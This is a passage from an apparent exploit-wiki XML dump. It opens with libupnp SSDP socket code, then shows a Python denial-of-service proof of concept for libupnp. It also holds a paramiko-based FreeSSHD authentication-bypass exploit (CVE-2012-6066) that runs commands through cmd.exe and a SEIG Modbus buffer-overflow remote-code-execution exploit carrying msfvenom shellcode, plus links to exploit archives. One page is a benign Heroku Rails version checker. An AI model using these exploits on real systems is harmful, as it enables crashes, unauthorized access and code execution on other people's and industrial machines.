	ret = bind(*ssdpSock, (struct sockaddr *)ssdpAddr4, sizeof(*ssdpAddr4));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in bind(), addr=0x%08X, port=%d: %s\n",
			   INADDR_ANY, SSDP_PORT, errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_BIND;
	}
	memset((void *)&amp;ssdpMcastAddr, 0, sizeof(struct ip_mreq));
	ssdpMcastAddr.imr_interface.s_addr = inet_addr(gIF_IPV4);
	ssdpMcastAddr.imr_multiaddr.s_addr = inet_addr(SSDP_IP);
	ret = setsockopt(*ssdpSock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
			 (char *)&amp;ssdpMcastAddr, sizeof(struct ip_mreq));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() IP_ADD_MEMBERSHIP (join multicast group): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
	/* Set multicast interface. */
	memset((void *)&amp;addr, 0, sizeof(struct in_addr));
	addr.s_addr = inet_addr(gIF_IPV4);
	ret = setsockopt(*ssdpSock, IPPROTO_IP, IP_MULTICAST_IF,
			 (char *)&amp;addr, sizeof addr);
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_INFO, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() IP_MULTICAST_IF (set multicast interface): %s\n",
			   errorBuffer);
		/* This is probably not a critical error, so let's continue. */
	}
	/* result is not checked becuase it will fail in WinMe and Win9x. */
	ret = setsockopt(*ssdpSock, IPPROTO_IP,
			 IP_MULTICAST_TTL, &amp;ttl, sizeof(ttl));
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_BROADCAST,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_BROADCAST (set broadcast): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_NETWORK_ERROR;
	}

	return UPNP_E_SUCCESS;
}

#ifdef INCLUDE_CLIENT_APIS
/*!
 * \brief Creates the SSDP IPv4 socket to be used by the control point.
 *
 * \return UPNP_E_SUCCESS on successful socket creation.
 */
static int create_ssdp_sock_reqv4(
	/*! [out] SSDP IPv4 request socket to be created. */
	SOCKET *ssdpReqSock)
{
	char errorBuffer[ERROR_BUFFER_LEN];
	u_char ttl = 4;

	*ssdpReqSock = socket(AF_INET, SOCK_DGRAM, 0);
	if (*ssdpReqSock == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in socket(): %s\n", errorBuffer);
		return UPNP_E_OUTOF_SOCKET;
	}
	setsockopt(*ssdpReqSock, IPPROTO_IP, IP_MULTICAST_TTL,
		   &amp;ttl, sizeof(ttl));
	/* just do it, regardless if fails or not. */
	sock_make_no_blocking(*ssdpReqSock);

	return UPNP_E_SUCCESS;
}

#ifdef UPNP_ENABLE_IPV6
/*!
 * \brief This function ...
 */
static int create_ssdp_sock_v6(
	/* [] SSDP IPv6 socket to be created. */
	SOCKET *ssdpSock)
{
	char errorBuffer[ERROR_BUFFER_LEN];
	struct ipv6_mreq ssdpMcastAddr;
	struct sockaddr_storage __ss;
	struct sockaddr_in6 *ssdpAddr6 = (struct sockaddr_in6 *)&amp;__ss;
	int onOff;
	int ret = 0;

	*ssdpSock = socket(AF_INET6, SOCK_DGRAM, 0);
	if (*ssdpSock == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in socket(): %s\n", errorBuffer);

		return UPNP_E_OUTOF_SOCKET;
	}
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEADDR,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEADDR: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#if defined(BSD) || defined(__OSX__) || defined(__APPLE__)
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEPORT,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEPORT: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#endif /* BSD, __OSX__, __APPLE__ */
	memset(&amp;__ss, 0, sizeof(__ss));
	ssdpAddr6-&gt;sin6_family = AF_INET6;
	ssdpAddr6-&gt;sin6_addr = in6addr_any;
	ssdpAddr6-&gt;sin6_scope_id = gIF_INDEX;
	ssdpAddr6-&gt;sin6_port = htons(SSDP_PORT);
	ret = bind(*ssdpSock, (struct sockaddr *)ssdpAddr6, sizeof(*ssdpAddr6));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in bind(), addr=0x%032lX, port=%d: %s\n",
			   0lu, SSDP_PORT, errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_BIND;
	}
	memset((void *)&amp;ssdpMcastAddr, 0, sizeof(ssdpMcastAddr));
	ssdpMcastAddr.ipv6mr_interface = gIF_INDEX;
	inet_pton(AF_INET6, SSDP_IPV6_LINKLOCAL,
		  &amp;ssdpMcastAddr.ipv6mr_multiaddr);
	ret = setsockopt(*ssdpSock, IPPROTO_IPV6, IPV6_JOIN_GROUP,
			(char *)&amp;ssdpMcastAddr, sizeof(ssdpMcastAddr));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() IPV6_JOIN_GROUP (join multicast group): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_BROADCAST,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_BROADCAST (set broadcast): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_NETWORK_ERROR;
	}

	return UPNP_E_SUCCESS;
}
#endif /* IPv6 */

#ifdef UPNP_ENABLE_IPV6
/*!
 * \brief This function ...
 */
static int create_ssdp_sock_v6_ula_gua(
	/*! [] SSDP IPv6 socket to be created. */
	SOCKET * ssdpSock)
{
	char errorBuffer[ERROR_BUFFER_LEN];
	struct ipv6_mreq ssdpMcastAddr;
	struct sockaddr_storage __ss;
	struct sockaddr_in6 *ssdpAddr6 = (struct sockaddr_in6 *)&amp;__ss;
	int onOff;
	int ret = 0;

	*ssdpSock = socket(AF_INET6, SOCK_DGRAM, 0);
	if (*ssdpSock == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in socket(): %s\n", errorBuffer);

		return UPNP_E_OUTOF_SOCKET;
	}
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEADDR,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEADDR: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#if defined(BSD) || defined(__OSX__) || defined(__APPLE__)
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_REUSEPORT,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_REUSEPORT: %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
#endif /* BSD, __OSX__, __APPLE__ */
	memset(&amp;__ss, 0, sizeof(__ss));
	ssdpAddr6-&gt;sin6_family = AF_INET6;
	ssdpAddr6-&gt;sin6_addr = in6addr_any;
	ssdpAddr6-&gt;sin6_scope_id = gIF_INDEX;
	ssdpAddr6-&gt;sin6_port = htons(SSDP_PORT);
	ret = bind(*ssdpSock, (struct sockaddr *)ssdpAddr6, sizeof(*ssdpAddr6));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in bind(), addr=0x%032lX, port=%d: %s\n",
			   0lu, SSDP_PORT, errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_BIND;
	}
	memset((void *)&amp;ssdpMcastAddr, 0, sizeof(ssdpMcastAddr));
	ssdpMcastAddr.ipv6mr_interface = gIF_INDEX;
	/* SITE LOCAL */
	inet_pton(AF_INET6, SSDP_IPV6_SITELOCAL,
		  &amp;ssdpMcastAddr.ipv6mr_multiaddr);
	ret = setsockopt(*ssdpSock, IPPROTO_IPV6, IPV6_JOIN_GROUP,
			(char *)&amp;ssdpMcastAddr, sizeof(ssdpMcastAddr));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() IPV6_JOIN_GROUP (join multicast group): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_SOCKET_ERROR;
	}
	onOff = 1;
	ret = setsockopt(*ssdpSock, SOL_SOCKET, SO_BROADCAST,
			 (char *)&amp;onOff, sizeof(onOff));
	if (ret == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in setsockopt() SO_BROADCAST (set broadcast): %s\n",
			   errorBuffer);
		shutdown(*ssdpSock, SD_BOTH);
		UpnpCloseSocket(*ssdpSock);

		return UPNP_E_NETWORK_ERROR;
	}

	return UPNP_E_SUCCESS;
}
#endif /* IPv6 */

/*!
 * \brief Creates the SSDP IPv6 socket to be used by the control point.
 */
#ifdef UPNP_ENABLE_IPV6
static int create_ssdp_sock_reqv6(
	/* [out] SSDP IPv6 request socket to be created. */
	SOCKET *ssdpReqSock)
{
	char errorBuffer[ERROR_BUFFER_LEN];
	char hops = 1;

	*ssdpReqSock = socket(AF_INET6, SOCK_DGRAM, 0);
	if (*ssdpReqSock == -1) {
		strerror_r(errno, errorBuffer, ERROR_BUFFER_LEN);
		UpnpPrintf(UPNP_CRITICAL, SSDP, __FILE__, __LINE__,
			   "Error in socket(): %s\n", errorBuffer);
		return UPNP_E_OUTOF_SOCKET;
	}
	/* MUST use scoping of IPv6 addresses to control the propagation os SSDP
	 * messages instead of relying on the Hop Limit (Equivalent to the TTL
	 * limit in IPv4). */
	setsockopt(*ssdpReqSock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS,
		   &amp;hops, sizeof(hops));
	/* just do it, regardless if fails or not. */
	sock_make_no_blocking(*ssdpReqSock);

	return UPNP_E_SUCCESS;
}
#endif /* IPv6 */
#endif /* INCLUDE_CLIENT_APIS */

int get_ssdp_sockets(MiniServerSockArray * out)
{
	int retVal;

#ifdef INCLUDE_CLIENT_APIS
	out-&gt;ssdpReqSock4 = INVALID_SOCKET;
	out-&gt;ssdpReqSock6 = INVALID_SOCKET;
	/* Create the IPv4 socket for SSDP REQUESTS */
	if (strlen(gIF_IPV4) &gt; 0) {
		retVal = create_ssdp_sock_reqv4(&amp;out-&gt;ssdpReqSock4);
		if (retVal != UPNP_E_SUCCESS)
			return retVal;
		/* For use by ssdp control point. */
		gSsdpReqSocket4 = out-&gt;ssdpReqSock4;
	} else
		out-&gt;ssdpReqSock4 = INVALID_SOCKET;
	/* Create the IPv6 socket for SSDP REQUESTS */
#ifdef UPNP_ENABLE_IPV6
	if (strlen(gIF_IPV6) &gt; 0) {
		retVal = create_ssdp_sock_reqv6(&amp;out-&gt;ssdpReqSock6);
		if (retVal != UPNP_E_SUCCESS) {
			shutdown(out-&gt;ssdpReqSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock4);
			return retVal;
		}
		/* For use by ssdp control point. */
		gSsdpReqSocket6 = out-&gt;ssdpReqSock6;
	} else
		out-&gt;ssdpReqSock6 = INVALID_SOCKET;
#endif /* IPv6 */
#endif /* INCLUDE_CLIENT_APIS */
	/* Create the IPv4 socket for SSDP */
	if (strlen(gIF_IPV4) &gt; 0) {
		retVal = create_ssdp_sock_v4(&amp;out-&gt;ssdpSock4);
		if (retVal != UPNP_E_SUCCESS) {
#ifdef INCLUDE_CLIENT_APIS
			shutdown(out-&gt;ssdpReqSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock4);
			shutdown(out-&gt;ssdpReqSock6, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock6);
#endif /* INCLUDE_CLIENT_APIS */
			return retVal;
		}
	} else
		out-&gt;ssdpSock4 = INVALID_SOCKET;
	/* Create the IPv6 socket for SSDP */
#ifdef UPNP_ENABLE_IPV6
	if (strlen(gIF_IPV6) &gt; 0) {
		retVal = create_ssdp_sock_v6(&amp;out-&gt;ssdpSock6);
		if (retVal != UPNP_E_SUCCESS) {
			shutdown(out-&gt;ssdpSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpSock4);
#ifdef INCLUDE_CLIENT_APIS
			shutdown(out-&gt;ssdpReqSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock4);
			shutdown(out-&gt;ssdpReqSock6, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock6);
#endif /* INCLUDE_CLIENT_APIS */
			return retVal;
		}
	} else
		out-&gt;ssdpSock6 = INVALID_SOCKET;
	if (strlen(gIF_IPV6_ULA_GUA) &gt; 0) {
		retVal = create_ssdp_sock_v6_ula_gua(&amp;out-&gt;ssdpSock6UlaGua);
		if (retVal != UPNP_E_SUCCESS) {
			shutdown(out-&gt;ssdpSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpSock4);
			shutdown(out-&gt;ssdpSock6, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpSock6);
#ifdef INCLUDE_CLIENT_APIS
			shutdown(out-&gt;ssdpReqSock4, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock4);
			shutdown(out-&gt;ssdpReqSock6, SD_BOTH);
			UpnpCloseSocket(out-&gt;ssdpReqSock6);
#endif /* INCLUDE_CLIENT_APIS */
			return retVal;
		}
	} else
		out-&gt;ssdpSock6UlaGua = INVALID_SOCKET;
#endif /* UPNP_ENABLE_IPV6 */

	return UPNP_E_SUCCESS;
}
#endif /* EXCLUDE_SSDP */

/* @} SSDPlib */

&lt;/pre&gt;


===libupnp_DoS_PoC.py===
&lt;pre&gt;
#!/usr/bin/python2
# -*- coding: utf-8 -*-
# Usage: python2 libupnp_DoS_PoC.py

import socket

TARGET = 'TARGET_IP'

'''
normal_traffic = \
    'M-SEARCH * HTTP/1.1\r\n'                   \
    'HOST:239.255.255.250:1900\r\n'             \
    'MX:3\r\n'                                  \
    'MAN:"ssdp:discover"\r\n'                   \
    'ST:upnp:rootdevice\r\n'                    \
    '\r\n'
'''

dos = \
    'M-SEARCH * HTTP/1.1\r\n'                   \
    'HOST:239.255.255.250:1900\r\n'             \
    'MX:3\r\n'                                  \
    'MAN:"ssdp:discover"\r\n'                   \
    'ST:uuid:schemas:device:{}:anything\r\n'    \
    '\r\n'.format("A"*512)

# Set up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(1)
s.sendto(dos, (TARGET, 1900))

try:
    while True:
        data, addr = s.recvfrom(65507)  # Maximum UDP data length
        print "------------------------\nFailed DoS...\n------------------------\n"
        print "Response:"
        print addr, data
        exit(1)
except socket.timeout:
    print "------------------------\nSuccessful DoS!!!\n------------------------\n"
    exit(0)

&lt;/pre&gt;</text>
      <sha1>myc8bpwbt3wbm9xefhyel1qlc7f2mm7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2012-6066 FreeSSHD遠程身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>741</id>
    <revision>
      <id>983</id>
      <timestamp>2021-04-04T06:33:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; import socket import paramiko import time  # this is a writeup exploit of CVE 2012-6066 # basically the  user needs to be on freeSSHd even since that authenticat..."</comment>
      <origin>983</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2555" sha1="nrg7hv2c14aw5xdghf60pu7mroz2eb9" xml:space="preserve">==POC==
&lt;pre&gt;
import socket
import paramiko
import time

# this is a writeup exploit of CVE 2012-6066
# basically the  user needs to be on freeSSHd even since that authentication failed.
# discovery and original PoC provided By Aris,kingCope (2012)
# mainly what KingCope did in his PoC is change the source file of ssh.c and sshconnect2.c in the OpenSSH source code 
# the changes are
#$ diff openssh-5.8p2/ssh.c openssh-5.8p2_2/ssh.c
#209c209
#&lt; static int ssh_session2(void);
#---
#&gt; int ssh_session2(void);
#1374c1374
#&lt; static int
#---
#&gt; int

#$ diff openssh-5.8p2/sshconnect2.c openssh-5.8p2_2/sshconnect2.c
#873a874,876
#&gt;     ssh_session2();
#&gt;       exit(0);
#&gt;
#1452a1456,1458
#&gt;     ssh_session2();
#&gt;       exit(0);
# the changes in the first file "ssh.c" changes the declaration type of the fuction "ssh_session2" from static int to int to enable it from getting called again within the same connection
# the changes in the second file "sshconnect2.c" calls the function "ssh_session2()" from "ssh.c" and exits right after the userauth_passwd() and userauth_pubkey() functions before any checks are made.
# after further analysis of the vulnerability My guess was that if i was able to interact with the ssh session ona lower level "Transport and channel level"
# i will be able to gain access and execute commands even if authentication fails same as the changes that was made by kingcope in the OpenSSH source file which exits immediatley after authentication functions are called.

# the prequisited of this script is to have paramiko module available also the user used in the exploit needs to be already in freeSSHD no password is needed
# this PoC will open internet Explorer but any command can be executed in the context of cmd.exe

# create Socket for transport 
# you may need to run it twice to get the command to execute 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('172.16.49.152',22))

# create transport layer over socket 
t = paramiko.transport.Transport(s)

# start client over trasnport session

t.start_client()

# try fake auth and pass exceptino to failure ( if u want to make sure that the aith fails with provided username and password remove the try,except, &amp; pass lines) and fix ident of the auth_password lines
try:
	t.auth_password('s','blablablabla')
except paramiko.SSHException:
	pass
# request channel with "session"
c = t.open_session()

#Execute iexplore.exe 

c.exec_command('cmd /c "c:\program files\internet Explorer\iexplore.exe"')
#time.sleep(10)
c.close()
t.close()
s.close()
&lt;/pre&gt;</text>
      <sha1>nrg7hv2c14aw5xdghf60pu7mroz2eb9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-0269 JSON gem 漏洞</title>
    <ns>0</ns>
    <id>750</id>
    <revision>
      <id>994</id>
      <timestamp>2021-04-05T05:06:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-0269.zip"</comment>
      <origin>994</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="c082rum2dhpni08h7kn0qd25nr24f2q" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-0269.zip</text>
      <sha1>c082rum2dhpni08h7kn0qd25nr24f2q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-0333 Ruby on Rails 2.3.x before 2.3.16 and 3.0.x before 3.0.20 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>751</id>
    <revision>
      <id>995</id>
      <timestamp>2021-04-05T05:49:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "===heroku-CVE-2013-0333.rb=== &lt;pre&gt; ## The quick-and-nasty CVE-2013-0333 Heroku inspector! ## Originally brought to you by @elliottkember with changes by @markpundsack and @ho..."</comment>
      <origin>995</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2153" sha1="6qvgv0zqtecjbo22rt008ffmnvxymvp" xml:space="preserve">===heroku-CVE-2013-0333.rb===
&lt;pre&gt;
## The quick-and-nasty CVE-2013-0333 Heroku inspector!
## Originally brought to you by @elliottkember with changes by @markpundsack and @hone @ Heroku
## Download and run using:
## ruby heroku-CVE-2013-0333.rb

require 'rubygems'

rails3_max  = Gem::Version.new("3.0.19")
rails3_min  = Gem::Version.new("3.0.0")
rails2_max  = Gem::Version.new("2.3.15")
rails2_min  = Gem::Version.new("2.3.0")

puts "Rails Versions Affected: &gt; #{rails3_min}, &lt;= #{rails3_max}, &gt; #{rails2_min}, &lt;= #{rails2_max}"
 
`heroku apps`.split("\n").each do |app|
  app = app.strip
  
  # Some "heroku apps" lines have === formatting for grouping. They're not apps.
  next if app[0..2] == "==="
  
  # Some are appended by owner emails
  app = app.split(" ")[0].to_s.strip
  
  # Blank lines can be ommitted.
  next if app == ""
  
  rails_path = `heroku run bundle show rails --app #{app}`.split("\n")[-1]
  rails_version_number = rails_path.split("rails-")[1]
  rails_version_number = rails_version_number.strip unless rails_version_number.nil?
  rails_version        = nil
  begin
    rails_version        = Gem::Version.new(rails_version_number)
    if rails_version_number &amp;&amp;
      (rails_version &gt; rails3_min &amp;&amp; rails_version &lt; rails3_max ||
       rails_version &gt; rails2_min &amp;&amp; rails_version &lt; rails2_max)
      puts "Uh oh! #{app} has #{rails_version_number}."
    else
      puts "..."
    end
  rescue ArgumentError =&gt; e
    puts "#{app} has Rails version: #{rails_version_number} installed, please verify it is correctly patched"
  end
end

&lt;/pre&gt;



===heroku-CVE-2013-0333.rb.asc===
&lt;pre&gt;
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.18 (Darwin)
Comment: GPGTools - http://gpgtools.org

iQEcBAABAgAGBQJRByIGAAoJEN8hShkacUVqQqgH+QHPnVZD4m7B3jwIulW6S7ur
c78xaAVQLNWhIS8JVlZo2VI9iDu1OdbX4S2spEHD5pqD8GJxMMkrborKafPY8nvD
7gU++hH4/tWtRbNEhJVTY9Aa30bxIjjholfrc58+kK8yZWJCO+yMap8leEUsCJAC
NUNwr2HF7yZj3SQl5r0r+w5EBjfrkyGglH2lHLm6Kh16aYi25KwH5F0JXYnovbYR
jyI/61OKdQ6bUN0wfEM8mqlmKSXflqY8NhOqHyeKdEB97MSDnlOPvhelgvkfmBVl
IdgsABEGqe5YDnO8zv2ZeMlffXDd8a6WOLuZQQgl6LeVK16Ji6x6u3njWkWN2Jg=
=zuOr
-----END PGP SIGNATURE-----

&lt;/pre&gt;</text>
      <sha1>6qvgv0zqtecjbo22rt008ffmnvxymvp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-0662 SEIG Modbus 3.4 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1208</id>
    <revision>
      <id>1513</id>
      <timestamp>2021-04-11T01:27:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Title: SEIG Modbus 3.4 - Remote Code Execution # Author: Alejandro Parodi # Date: 2018-08-17 # Vendor Homepage: https://www.schneider-electric.com # Software L..."</comment>
      <origin>1513</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2501" sha1="maqy9hxor73751nsfefuex21y3n8rz9" xml:space="preserve">==EXP==
&lt;pre&gt;
# Title: SEIG Modbus 3.4 - Remote Code Execution
# Author: Alejandro Parodi
# Date: 2018-08-17
# Vendor Homepage: https://www.schneider-electric.com
# Software Link: https://github.com/hdbreaker/Ricnar-Exploit-Solutions/tree/master/Medium/CVE-2013-0662-SEIG-Modbus-Driver-v3.34/VERSION%203.4
# Version: v3.4
# Tested on: Windows XP SP3
# CVE: CVE-2013-0662
# References:
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0662
 
import socket
import struct
 
ip = "192.168.127.138"
port = 27700
con = (ip, port)
 
 
####### MESSAGE ##########
message_header = "\x00\x64"
message_buffer = "A" * 0x5dc
eip = struct.pack("&lt;I", 0x7C9C167D)
 
# Shellcode generated with:
# msfvenom -a x86 --platform windows -p windows/exec cmd=calc -e x86/xor_call4 -f python
# Shellcode Size: 189 bytes
nopsleed = "\x90" * 100 # \x90 bad char bypass
shellcode  = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode += "\xff\xd5\x63\x61\x6c\x63\x00"
 
message = message_header + message_buffer + eip + nopsleed + shellcode
print "Message Len: " + hex(len(message)) + " bytes"
##########################
 
######## PKG HEADER ######
header_padding = "\x42\x42"
header_buf_size = "\xFF\xFF"
header_recv_len = struct.pack("&gt;H", len(message))
header_end = "\x44"
 
header = header_padding + header_buf_size + header_recv_len + header_end
##########################
 
######## CRAFTING PAYLOAD ########
payload = header + message
print "Package Len: "+hex(len(payload)) + " bytes"
##################################
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(con)
s.send(payload)
&lt;/pre&gt;</text>
      <sha1>maqy9hxor73751nsfefuex21y3n8rz9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-1081 Novell ZENworks Mobile Management (ZMM) 2.6.1 and 2.7.0文件包含漏洞</title>
    <ns>0</ns>
    <id>762</id>
    <revision>
      <id>1010</id>
      <timestamp>2021-04-06T02:26:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-1081.zip"</comment>
      <origin>1010</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="kaox1v00h2btn4qi01v6k2s1qzeqr9w" xml:space="preserve">==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2013-1081.zip</text>
      <sha1>kaox1v00h2btn4qi01v6k2s1qzeqr9w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2013-1300 Win32k內存分配漏洞</title>
    <ns>0</ns>
    <id>763</id>
    <revision>
      <id>1011</id>
      <timestamp>2021-04-06T02:29:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
